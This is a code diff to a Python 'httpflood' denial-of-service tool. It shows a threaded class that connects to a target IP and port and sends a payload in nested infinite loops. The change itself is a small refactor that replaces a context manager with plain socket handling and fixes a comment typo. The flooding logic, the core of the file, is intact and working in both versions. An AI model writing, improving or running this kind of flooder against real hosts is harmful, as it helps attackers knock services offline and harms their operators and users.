@@ -30,21 +30,22 @@ class httpflood(threading.Thread):
 		# Create an infinite loop
 		while True:
 			# Create the socket
-			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attack_socket:
-				# Connect to targer
-				attack_socket.connect((self.target_ip, self.target_port))
-				
-				# Create infinite loop
-				while True:
-					# Attempt to transmit data
-					try:
-						attack_socket.send(bytes(self.payload.encode("utf-8")))
-					except socket.error:
-						# Break from the infinite loop
-						break
-						
-				# Close the socket
-				attack_socket.close()
+			attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			
+			# Connect to target
+			attack_socket.connect((self.target_ip, self.target_port))
+			
+			# Create infinite loop
+			while True:
+				# Attempt to transmit data
+				try:
+					attack_socket.send(bytes(self.payload.encode("utf-8")))
+				except socket.error:
+					# Break from the infinite loop
+					break
+					
+			# Close the socket
+			attack_socket.close()
 				
 # Define the begin() function
 def begin(attack_threads, target_ip, target_port):
